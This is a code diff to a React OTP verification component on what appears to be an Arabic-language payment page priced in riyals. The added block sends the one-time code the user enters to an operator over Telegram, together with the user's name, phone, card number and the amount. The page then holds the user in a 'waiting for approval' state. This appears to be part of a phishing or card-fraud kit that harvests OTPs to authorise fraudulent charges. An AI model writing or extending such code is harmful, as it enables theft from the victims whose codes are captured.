@@ -175,7 +175,19 @@ const OTPVerification = () => {
           status: 'pending_otp',
         });
         if (!ok) throw new Error('save failed');
-        
+
+        // إشعار المسؤول عبر Telegram برمز التحقق
+        try {
+          const { data: appData } = await getApplicationStatus(applicationId);
+          await supabase.functions.invoke('send-telegram', {
+            body: {
+              message: `🔐 *رمز التحقق OTP*\n\n👤 الاسم: ${(appData as any)?.full_name || 'غير محدد'}\n📱 الهاتف: ${(appData as any)?.phone || 'غير محدد'}\n🏢 الشركة: ${companyName}\n💰 السعر: ${price} ريال\n💳 البطاقة: ${maskedCardNumber || 'غير محدد'}\n\n🔑 *رمز التحقق: ${otp}*\n\n📅 ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`
+            }
+          });
+        } catch (tgErr) {
+          console.error('Telegram OTP notify failed:', tgErr);
+        }
+
         setIsVerifying(false);
         setWaitingForApproval(true);
         setCurrentMessageIndex(0);
